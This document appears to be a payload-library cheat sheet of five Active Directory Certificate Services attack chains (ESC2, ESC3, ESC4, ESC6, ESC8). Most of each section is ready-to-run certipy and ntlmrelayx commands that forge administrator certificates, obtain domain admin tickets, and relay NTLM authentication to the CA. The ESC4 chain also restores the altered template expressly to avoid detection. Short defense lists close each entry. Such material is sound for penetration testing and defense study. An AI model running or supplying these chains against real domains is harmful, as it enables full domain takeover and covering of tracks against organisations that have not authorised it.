# ADCS Attacks

_5 intranet payloads_

### ADCS ESC2 Attack  `adcs-esc2`
_Exploit ESC2 template misconfiguration_
Subclass: **ESC2** · tags: `adcs` `esc2` `certificate`

**Prerequisites:**
- Domain environment
- ADCS service
- ESC2 template present

**Attack chain:**

**Detect ESC2 template**
> Detect ESC2 template
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
Look for Any Purpose or CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT templates
```

**Request certificate**
> Request administrator certificate
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```
**Syntax breakdown:**
- `-template` — specify the vulnerable template _parameter_
- `-upn` — specify the target user UPN _parameter_

**Authenticate with certificate**
> Authenticate with certificate
_platform: linux_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
Obtain administrator TGT
```

**Overview:** ESC2 allows requesting a certificate for any purpose, which can be used to impersonate any user.

**Vulnerability principle:** The certificate template configuration allows the Any Purpose extension.

**Exploitation method:** Flow: 1) Discover ESC2 template 2) Request administrator certificate 3) Authenticate with certificate

**Defenses:** 1) Audit certificate templates 2) Disable Any Purpose 3) Monitor certificate requests

---

### ADCS ESC3 Attack  `adcs-esc3`
_Exploit ESC3 enrollment agent misconfiguration_
Subclass: **ESC3** · tags: `adcs` `esc3` `certificate`

**Prerequisites:**
- Domain environment
- ADCS service
- ESC3 configuration present

**Attack chain:**

**Detect ESC3**
> Detect ESC3 configuration
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
Look for templates with Enrollment Agent rights
```

**Obtain enrollment agent certificate**
> Obtain enrollment agent certificate
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent
Obtain enrollment agent certificate
```

**Request certificate on behalf of another user**
> Request certificate on behalf of administrator
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\Administrator -pfx agent.pfx
```
**Syntax breakdown:**
- `-on-behalf-of` — request on behalf of another user _parameter_
- `-pfx agent.pfx` — use the agent certificate _parameter_

**Overview:** ESC3 allows an enrollment agent to request certificates on behalf of other users.

**Vulnerability principle:** The certificate template allows the enrollment agent functionality.

**Exploitation method:** Flow: 1) Obtain agent certificate 2) Request administrator certificate on behalf of the admin 3) Authenticate with certificate

**Defenses:** 1) Restrict enrollment agent permissions 2) Audit agent certificates 3) Monitor abnormal requests

---

### ADCS ESC4 Attack  `adcs-esc4`
_Exploit ESC4 template permission misconfiguration_
Subclass: **ESC4** · tags: `adcs` `esc4` `certificate`

**Prerequisites:**
- Domain environment
- ADCS service
- Write permission on the template

**Attack chain:**

**Detect ESC4**
> Detect template permissions
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
Look for templates the user has write permission on
```

**Modify template configuration**
> Modify template configuration
_platform: linux_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old
Modify the template to an ESC1-style configuration
```

**Request certificate**
> Request administrator certificate
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```
**Syntax breakdown:**
- `-save-old` — save the original configuration for restoration _parameter_
- `modify template` — enable the SAN extension _keyword_

**Restore template configuration**
> Restore template configuration
_platform: linux_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
Restore the original configuration to avoid detection
```

**Overview:** ESC4 allows privilege escalation by modifying certificate template configuration.

**Vulnerability principle:** The user has write permission on the certificate template.

**Exploitation method:** Flow: 1) Discover writable template 2) Modify configuration 3) Request certificate 4) Restore configuration

**Defenses:** 1) Audit template permissions 2) Restrict write permissions 3) Monitor template modifications

---

### ADCS ESC6 Attack  `adcs-esc6`
_Exploit ESC6 edit-flag misconfiguration_
Subclass: **ESC6** · tags: `adcs` `esc6` `certificate`

**Prerequisites:**
- Domain environment
- ADCS service
- CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled

**Attack chain:**

**Detect ESC6**
> Detect CA configuration
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
Look for the EDITF_ATTRIBUTESUBJECTALTNAME2 flag
```

**Request certificate**
> Request administrator certificate
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
Use the -alt parameter to specify the SAN
```
**Syntax breakdown:**
- `-alt` — specify the Subject Alternative Name _parameter_
- `EDITF_ATTRIBUTESUBJECTALTNAME2` — CA allows specifying SAN in the request _keyword_

**Authenticate with certificate**
> Authenticate to obtain TGT
_platform: linux_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

**Overview:** ESC6 allows specifying an arbitrary SAN in the certificate request.

**Vulnerability principle:** The CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag configured.

**Exploitation method:** Flow: 1) Detect CA configuration 2) Request certificate with administrator SAN 3) Authenticate

**Defenses:** 1) Remove the EDITF_ATTRIBUTESUBJECTALTNAME2 flag 2) Monitor certificate requests 3) Audit CA configuration

---

### ADCS ESC8 Attack  `adcs-esc8`
_Exploit the ESC8 HTTP endpoint for NTLM relay_
Subclass: **ESC8** · tags: `adcs` `esc8` `ntlm-relay`

**Prerequisites:**
- Domain environment
- ADCS HTTP endpoint
- Ability to trigger NTLM authentication

**Attack chain:**

**Detect ESC8**
> Detect HTTP endpoint
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
Look for HTTP certificate endpoints
```

**Set up NTLM relay**
> Set up NTLM relay
_platform: linux_
```
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
Listen for NTLM authentication and relay to ADCS
```
**Syntax breakdown:**
- `-t http://CA_SERVER` — target ADCS HTTP endpoint _parameter_
- `--adcs` — enable ADCS template _parameter_

**Trigger authentication**
> Trigger target NTLM authentication
```
Use various methods to trigger:
- Send email link
- Printer vulnerability
- WebDAV
- Other NTLM trigger methods
```

**Overview:** ESC8 abuses the ADCS HTTP endpoint for NTLM relay attacks.

**Vulnerability principle:** The ADCS HTTP endpoint supports NTLM authentication without signing enabled.

**Exploitation method:** Flow: 1) Set up relay server 2) Trigger target authentication 3) Obtain certificate

**Defenses:** 1) Enable channel binding 2) Disable HTTP endpoint 3) Enable Extended Protection

---
